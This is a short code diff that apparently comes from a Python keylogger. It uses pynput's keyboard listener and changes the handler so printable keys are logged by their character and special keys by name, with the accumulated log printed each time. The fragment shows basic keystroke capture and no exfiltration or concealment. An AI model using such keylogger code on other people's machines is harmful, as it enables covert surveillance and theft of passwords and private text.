@@ -7,8 +7,12 @@ log = ""
 
 def process_key_press(key):
     global log
-    log = log + str(key)
-    print(log)
+    try:
+        log = log + str(key.char)
+        print(log)
+    except AttributeError:
+        log = log + str(key)
+        print(log)
 
 
 keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
